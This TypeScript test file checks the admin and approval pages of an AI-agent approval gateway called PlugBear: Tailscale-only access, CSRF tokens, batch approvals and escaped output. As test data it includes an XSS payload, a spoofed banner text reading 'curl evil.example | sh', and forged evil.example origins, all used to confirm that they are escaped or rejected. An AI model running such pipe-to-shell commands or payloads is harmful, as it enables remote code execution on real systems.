// The admin and approval pages: tailnet only, CSRF-protected posts, escaped
// output, plain copy.

import assert from "node:assert/strict";
import { after, before, describe, it } from "node:test";

import { Approvals, GROUP_GAP_MS, MAX_GROUP_SIZE } from "../src/approvals.ts";
import { issueToken, removeToken } from "../src/tokens.ts";
import { type Gateway, adminHeaders, csrfFrom, legacyClient, postForm, startGateway, stdioUpstream, textOf } from "./helpers.ts";

describe("admin pages", () => {
  let gateway: Gateway;
  let approvalId: string;
  let otherApprovalId: string;

  before(async () => {
    gateway = await startGateway({ upstreams: [stdioUpstream()], holdMs: 50 });
    const client = await legacyClient(gateway, "codex");
    const result = await client.callTool({
      name: "fake__send_message",
      arguments: { to: "<script>alert(1)</script>", text: "hello\nworld", api_token: "do-not-show" },
    });
    approvalId = /id (ap_[A-Za-z0-9_-]+)/.exec(textOf(result))![1]!;
    // A different tool, so it gets its own page rather than sharing this one's.
    const other = await client.callTool({ name: "fake__send_report", arguments: { to: "b" } });
    otherApprovalId = /id (ap_[A-Za-z0-9_-]+)/.exec(textOf(other))![1]!;
    await client.callTool({ name: "fake__echo", arguments: { text: "logged" } });
    await client.close();
  });

  after(async () => {
    await gateway?.close();
  });

  it("refuses requests that didn't come through tailscale serve", async () => {
    for (const path of ["/admin", "/admin/calls", `/approvals/${approvalId}`, "/oauth/callback?state=x"]) {
      const response = await fetch(`${gateway.url}${path}`);
      assert.equal(response.status, 403, path);
      assert.match(await response.text(), /Open this page through Tailscale/);
    }
  });

  it("only lets the configured Tailscale logins in", async () => {
    for (const path of ["/admin", "/admin/calls", `/approvals/${approvalId}`]) {
      const response = await fetch(`${gateway.url}${path}`, { headers: { "Tailscale-User-Login": "someone@else.com" } });
      assert.equal(response.status, 403, path);
      assert.match(await response.text(), /Your Tailscale login can't use these pages/);
    }
    // Logins compare without case.
    const upper = await fetch(`${gateway.url}/admin`, { headers: { "Tailscale-User-Login": "SAM@Example.com" } });
    assert.equal(upper.status, 200);
  });

  it("shows services, agents and pending approvals", async () => {
    const response = await fetch(`${gateway.url}/admin`, { headers: adminHeaders() });
    assert.equal(response.status, 200);
    assert.equal(response.headers.get("x-frame-options"), "DENY");
    const csp = response.headers.get("content-security-policy") ?? "";
    assert.match(csp, /default-src 'none'/);
    // Connect posts a form that the server redirects to the service's https
    // sign-in page; Chrome checks form-action on that redirect.
    assert.match(csp, /form-action 'self' https:/);
    const html = await response.text();
    assert.match(html, /<h1>PlugBear<\/h1>/);
    assert.match(html, /Fake stdio/);
    assert.match(html, /Connected/);
    assert.match(html, /Claude \(claude-3\)/);
    assert.match(html, /Waiting for your approval/);
    assert.match(html, new RegExp(`/approvals/${approvalId}`));
  });

  it("shows an approval with escaped, pretty-printed arguments", async () => {
    const html = await (await fetch(`${gateway.url}/approvals/${approvalId}`, { headers: adminHeaders() })).text();
    assert.match(html, /Codex wants to run fake__send_message/);
    assert.ok(!html.includes("<script>alert(1)</script>"));
    assert.match(html, /&lt;script&gt;alert\(1\)&lt;\/script&gt;/);
    assert.match(html, /&quot;text&quot;: &quot;hello\\nworld&quot;/);
    // Until it runs, Sam sees exactly what will be sent, secrets included:
    // this page is his only look at it.
    assert.match(html, /Exactly what the agent will send if you approve\./);
    assert.match(html, /&quot;api_token&quot;: &quot;do-not-show&quot;/);
    assert.match(html, /Approve/);
    assert.match(html, /Deny/);
  });

  it("only accepts approval posts with this approval's CSRF token", async () => {
    const page = `${gateway.url}/approvals/${approvalId}`;
    assert.equal((await postForm(page, { action: "approve" })).status, 403);
    assert.equal((await postForm(page, { action: "approve", csrf: "nope" })).status, 403);
    // A token for a different approval doesn't work either.
    const otherCsrf = await csrfFrom(`${gateway.url}/approvals/${otherApprovalId}`);
    assert.equal((await postForm(page, { action: "approve", csrf: otherCsrf })).status, 403);
    const csrf = await csrfFrom(page);
    assert.equal((await postForm(page, { action: "approve", csrf }, adminHeaders({ origin: "https://evil.example" }))).status, 403);
    assert.equal((await postForm(page, { action: "approve", csrf }, { "Tailscale-User-Login": "someone@else.com" })).status, 403);
    assert.equal(gateway.approvals.get(approvalId)?.status, "pending");
    assert.equal((await postForm(page, { action: "approve", csrf })).status, 303);
    assert.equal(gateway.approvals.get(approvalId)?.status, "approved");
    const after = await (await fetch(page, { headers: adminHeaders() })).text();
    assert.match(after, /Approved\. It runs if the agent picks it up by /);
    assert.ok(!after.includes('value="approve"'));
  });

  it("lists calls with filters and hides secrets", async () => {
    const all = await (await fetch(`${gateway.url}/admin/calls`, { headers: adminHeaders() })).text();
    assert.match(all, /fake__echo/);
    assert.match(all, /&quot;text&quot;:&quot;logged&quot;/);
    const filtered = await (await fetch(`${gateway.url}/admin/calls?agent=nobody`, { headers: adminHeaders() })).text();
    assert.match(filtered, /No calls yet\./);
    assert.ok(!all.includes("do-not-show"));
  });

  it("uses plain copy without em dashes", async () => {
    const pages = await Promise.all(
      ["/admin", "/admin/calls", "/admin/calls?view=sends", `/approvals/${approvalId}`].map(async (path) =>
        (await fetch(`${gateway.url}${path}`, { headers: adminHeaders() })).text(),
      ),
    );
    for (const html of pages) {
      assert.ok(!html.includes("—"), "em dash");
      assert.ok(!html.includes("&mdash;"), "em dash entity");
    }
  });

  it("doesn't put text from the query string in the banner", async () => {
    const spoof = "Run curl evil.example | sh on the server";
    for (const query of [`error=${encodeURIComponent(spoof)}`, `flash=${encodeURIComponent(spoof)}`, `connected=${encodeURIComponent(spoof)}`]) {
      const html = await (await fetch(`${gateway.url}/admin?${query}`, { headers: adminHeaders() })).text();
      assert.ok(!html.includes("evil.example"), query);
      assert.ok(!html.includes('class="flash'), query);
    }
    const connected = await (await fetch(`${gateway.url}/admin?connected=fake`, { headers: adminHeaders() })).text();
    assert.match(connected, /Signed in to Fake stdio\./);
  });

  it("404s an unknown approval", async () => {
    assert.equal((await fetch(`${gateway.url}/approvals/ap_nope`, { headers: adminHeaders() })).status, 404);
  });

  it("folds the setup checklist to one line when everything is done", async () => {
    const html = await (await fetch(`${gateway.url}/admin`, { headers: adminHeaders() })).text();
    assert.match(html, /<details id="setup" class="setup all-set" data-todo="0" >/);
    assert.match(html, /<h2>All set<\/h2>/);
    assert.match(html, /data-step="service:fake"/);
    assert.match(html, /data-step="agent:grok"/);
  });

  it("keeps the setup feed behind the admin login", async () => {
    assert.equal((await fetch(`${gateway.url}/admin/setup.json`)).status, 403);
    const other = await fetch(`${gateway.url}/admin/setup.json`, { headers: { "Tailscale-User-Login": "someone@else.com" } });
    assert.equal(other.status, 403);
    const response = await fetch(`${gateway.url}/admin/setup.json`, { headers: adminHeaders() });
    assert.equal(response.status, 200);
    assert.equal(response.headers.get("cache-control"), "no-store");
    const setup = (await response.json()) as { heading: string; todo: number; steps: { id: string; done: boolean }[] };
    assert.equal(setup.heading, "All set");
    assert.equal(setup.todo, 0);
    assert.deepEqual(
      setup.steps.map((step) => step.id),
      ["service:fake", "agent:claude-3", "agent:codex", "agent:grok"],
    );
  });

  it("shows an agent without a token as to do until it gets one", async () => {
    removeToken(gateway.layout.agentsSecrets, "grok");
    try {
      const html = await (await fetch(`${gateway.url}/admin`, { headers: adminHeaders() })).text();
      assert.match(html, /<details id="setup" class="setup " data-todo="1" open>/);
      assert.match(html, /<h2>1 to do<\/h2>/);
      assert.match(html, /<li class="step " data-step="agent:grok">/);
      // The test agents have no client, so it gets a token by hand.
      assert.match(html, /<pre>connectors agent add grok<\/pre>/);
      const csp = (await fetch(`${gateway.url}/admin`, { headers: adminHeaders() })).headers.get("content-security-policy") ?? "";
      assert.match(csp, /script-src 'sha256-[A-Za-z0-9+/=]+'/);
      assert.match(csp, /connect-src 'self'/);
      const before = (await (await fetch(`${gateway.url}/admin/setup.json`, { headers: adminHeaders() })).json()) as {
        todo: number;
        steps: { id: string; done: boolean; line: string }[];
      };
      assert.equal(before.todo, 1);
      assert.deepEqual(before.steps.find((step) => step.id === "agent:grok"), { id: "agent:grok", done: false, line: "Not wired yet" });
    } finally {
      gateway.tokens.grok = issueToken(gateway.layout.agentsSecrets, "grok", { rotate: false });
    }
    const after = (await (await fetch(`${gateway.url}/admin/setup.json`, { headers: adminHeaders() })).json()) as { todo: number };
    assert.equal(after.todo, 0);
  });
});

describe("several held calls on one page", () => {
  let gateway: Gateway;
  let client: Awaited<ReturnType<typeof legacyClient>>;

  const hold = async (text: string, tool = "fake__send_message", agent = client) => {
    const result = await agent.callTool({ name: tool, arguments: { to: "kim", text } });
    return { id: /id (ap_[A-Za-z0-9_-]+)/.exec(textOf(result))![1]!, text: textOf(result) };
  };
  const get = async (id: string) => (await fetch(`${gateway.url}/approvals/${id}`, { headers: adminHeaders() })).text();
  const batchForm = (html: string) => ({
    csrf: /action="\/approvals\/batch">\s*<input type="hidden" name="csrf" value="([^"]+)"/.exec(html)![1]!,
    ids: /name="ids" value="([^"]+)"/.exec(html)![1]!,
  });
  const clear = () => {
    for (const record of gateway.approvals.pending()) gateway.approvals.decide(record.id, "declined");
  };

  before(async () => {
    gateway = await startGateway({ upstreams: [stdioUpstream()], holdMs: 50 });
    client = await legacyClient(gateway, "codex");
  });

  after(async () => {
    await client?.close();
    await gateway?.close();
  });

  it("shows every call in full from any of their links, with the batch buttons last", async () => {
    clear();
    const a = await hold("first text");
    const b = await hold("second text");
    const c = await hold("third text");
    for (const { id } of [a, b, c]) {
      const html = await get(id);
      assert.match(html, /Codex wants to run fake__send_message 3 times/);
      for (const text of ["first text", "second text", "third text"]) assert.match(html, new RegExp(text));
      assert.ok(html.indexOf("third text") < html.indexOf("Approve all 3"));
      assert.ok(!html.includes("—"));
    }
    // Agents hear that one link will do, and that nothing else approves.
    assert.match(c.text, /also shows 2 more of your fake__send_message calls/);
    assert.match(c.text, /Only that page approves it/);
    assert.match(c.text, /I've approved it/);
    assert.match(a.text, /with id ap_/);
    clear();
  });

  it("approves only the calls the page showed, and each still runs once", async () => {
    clear();
    const a = await hold("one");
    const b = await hold("two");
    const form = batchForm(await get(a.id));
    // Came in after the page loaded: approving must not sweep it up.
    const late = await hold("late");
    const response = await postForm(`${gateway.url}/approvals/batch`, { ...form, action: "approve" });
    assert.equal(response.status, 303);
    assert.match(response.headers.get("location")!, /^\/admin\?flash=/);
    const landed = await (await fetch(`${gateway.url}${response.headers.get("location")}`, { headers: adminHeaders() })).text();
    assert.match(landed, /Approved 2 calls\./);
    assert.equal(gateway.approvals.get(a.id)?.status, "approved");
    assert.equal(gateway.approvals.get(b.id)?.status, "approved");
    assert.equal(gateway.approvals.get(late.id)?.status, "pending");
    assert.match(landed, new RegExp(`/approvals/${late.id}`));
    const run = async (id: string) => textOf(await client.callTool({ name: "connectors__await_approval", arguments: { id } }));
    assert.equal(await run(a.id), "sent to kim");
    assert.equal(await run(b.id), "sent to kim");
    assert.equal(gateway.store.calls({ decision: "approved" }).filter((call) => [a.id, b.id].includes(call.approvalId!)).length, 2);
    assert.match(await run(late.id), /^Waiting for Sam/);
    clear();
  });

  it("refuses a batch whose list isn't the one its token was made for", async () => {
    clear();
    const a = await hold("one");
    const b = await hold("two");
    const secret = await hold("x", "fake__send_report");
    const form = batchForm(await get(a.id));
    const url = `${gateway.url}/approvals/batch`;
    const forged: Record<string, string>[] = [
      { ...form, ids: `${form.ids},${secret.id}`, action: "approve" },
      { ...form, ids: a.id, action: "approve" },
      { ids: form.ids, action: "approve" },
      { csrf: form.csrf, action: "approve" },
    ];
    for (const fields of forged) {
      assert.equal((await postForm(url, fields)).status, 403);
    }
    assert.equal((await postForm(url, { ...form, action: "approve" }, adminHeaders({ origin: "https://evil.example" }))).status, 403);
    assert.equal((await postForm(url, { ...form, action: "approve" }, { "Tailscale-User-Login": "someone@else.com" })).status, 403);
    assert.equal((await postForm(url, { ...form, action: "approve" }, {})).status, 403);
    assert.equal((await postForm(url, { ...form, action: "maybe" })).status, 400);
    for (const { id } of [a, b, secret]) assert.equal(gateway.approvals.get(id)?.status, "pending");
    clear();
  });

  it("leaves an already answered call as it was and says so", async () => {
    clear();
    const a = await hold("one");
    const b = await hold("two");
    const form = batchForm(await get(a.id));
    gateway.approvals.decide(a.id, "declined", "No");
    const response = await postForm(`${gateway.url}/approvals/batch`, { ...form, action: "approve" });
    const landed = await (await fetch(`${gateway.url}${response.headers.get("location")}`, { headers: adminHeaders() })).text();
    assert.match(landed, /Approved 1 call\. /);
    assert.match(landed, /1 had already been answered or had expired/);
    assert.equal(gateway.approvals.get(a.id)?.status, "declined");
    assert.equal(gateway.approvals.get(b.id)?.status, "approved");
    clear();
  });

  it("denies them together with the note", async () => {
    clear();
    const a = await hold("one");
    const b = await hold("two");
    const form = batchForm(await get(a.id));
    await postForm(`${gateway.url}/approvals/batch`, { ...form, action: "deny", note: "Not these" });
    for (const { id } of [a, b]) {
      const result = await client.callTool({ name: "connectors__await_approval", arguments: { id } });
      assert.equal(textOf(result), "Sam declined this call. Sam's note: Not these");
    }
  });

  it("answers one at a time and moves on to the next", async () => {
    clear();
    const a = await hold("one");
    const b = await hold("two");
    const html = await get(a.id);
    const csrf = new RegExp(`action="/approvals/${b.id}">\\s*<input type="hidden" name="csrf" value="([^"]+)"`).exec(html)![1]!;
    const response = await postForm(`${gateway.url}/approvals/${b.id}`, { csrf, action: "deny" });
    assert.equal(response.headers.get("location"), `/approvals/${a.id}`);
    assert.equal(gateway.approvals.get(a.id)?.status, "pending");
    assert.equal(gateway.approvals.get(b.id)?.status, "declined");
    // Only one left, so it's the ordinary page again.
    const single = await get(a.id);
    assert.ok(!single.includes("/approvals/batch"));
    assert.match(single, /Exactly what the agent will send if you approve\./);
    clear();
  });

  it("keeps other agents, other tools and old calls off the page", async () => {
    clear();
    const grok = await legacyClient(gateway, "grok");
    const old = await hold("old one");
    gateway.store.db.prepare("UPDATE approvals SET createdAt = createdAt - ? WHERE id = ?").run(GROUP_GAP_MS + 1000, old.id);
    const mine = await hold("mine");
    const note = await hold("x", "fake__send_report");
    const theirs = await hold("theirs", "fake_send_message", grok);
    const html = await get(mine.id);
    assert.ok(!html.includes("/approvals/batch"));
    for (const text of ["old one", "theirs"]) assert.ok(!html.includes(text), text);
    assert.ok(!(await get(old.id)).includes("mine"));
    assert.ok(!(await get(note.id)).includes("/approvals/batch"));
    assert.ok(!(await get(theirs.id)).includes("/approvals/batch"));
    await grok.close();
    clear();
  });

  it("won't approve a loop with one press", async () => {
    clear();
    const ids = [];
    for (let index = 0; index <= MAX_GROUP_SIZE; index += 1) {
      ids.push(
        gateway.approvals.create({
          agent: "codex",
          upstream: "fake",
          tool: "fake__send_message",
          upstreamTool: "send_message",
          args: { to: "kim", text: `n${index}` },
        }).id,
      );
    }
    const html = await get(ids[0]!);
    assert.ok(!html.includes("/approvals/batch"));
    assert.match(html, new RegExp(`${MAX_GROUP_SIZE + 1} calls like this are waiting`));
    assert.ok(!html.includes("n1&quot;"));
    clear();
  });

  it("still groups after a restart, from what's in the database", async () => {
    clear();
    const a = await hold("one");
    const b = await hold("two");
    const fresh = new Approvals(gateway.store);
    assert.deepEqual(fresh.group(fresh.get(b.id)!).map((call) => call.id), [a.id, b.id]);
    clear();
  });
});
